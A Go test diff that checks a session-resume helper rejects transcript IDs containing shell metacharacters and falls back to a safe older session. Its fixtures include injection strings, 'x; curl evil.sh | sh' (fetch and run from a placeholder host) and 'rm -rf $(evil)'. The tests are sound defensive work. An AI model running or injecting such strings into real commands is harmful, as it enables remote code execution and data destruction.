@@ -77,3 +77,39 @@ func TestHomeHonoursClaudeConfigDir(t *testing.T) {
 	t.Setenv("CLAUDE_CONFIG_DIR", "/tmp/custom-claude")
 	assert.Equal(t, "/tmp/custom-claude", Home())
 }
+
+func TestLastClaudeSessionRejectsUnsafeIDs(t *testing.T) {
+	home := t.TempDir()
+	cwd := "/Users/me/dev/app"
+	base := time.Now().Add(-time.Hour)
+
+	// A transcript named with shell metacharacters must never be handed back,
+	// even when it is the newest file in the directory — the id is typed
+	// verbatim into a shell as `claude --resume <id>`.
+	writeTranscript(t, home, cwd, "x; curl evil.sh | sh", base.Add(time.Hour))
+
+	assert.Equal(t, "", LastClaudeSession(home, cwd, base))
+}
+
+func TestLastClaudeSessionAcceptsUUIDStyleIDs(t *testing.T) {
+	home := t.TempDir()
+	cwd := "/Users/me/dev/app"
+	base := time.Now().Add(-time.Hour)
+
+	writeTranscript(t, home, cwd, "3fa6c2b0-7e4c-4c1a-9d0e-2a1b3c4d5e6f", base.Add(time.Hour))
+
+	assert.Equal(t, "3fa6c2b0-7e4c-4c1a-9d0e-2a1b3c4d5e6f", LastClaudeSession(home, cwd, base))
+}
+
+func TestLastClaudeSessionSkipsUnsafeNewestAndFallsBackToLegitimateOlder(t *testing.T) {
+	home := t.TempDir()
+	cwd := "/Users/me/dev/app"
+	base := time.Now().Add(-time.Hour)
+
+	writeTranscript(t, home, cwd, "legit-session", base.Add(10*time.Minute))
+	// Newest by mtime, but unsafe — must be skipped in favour of the legitimate,
+	// older transcript rather than returning nothing at all.
+	writeTranscript(t, home, cwd, "rm -rf $(evil)", base.Add(30*time.Minute))
+
+	assert.Equal(t, "legit-session", LastClaudeSession(home, cwd, base))
+}
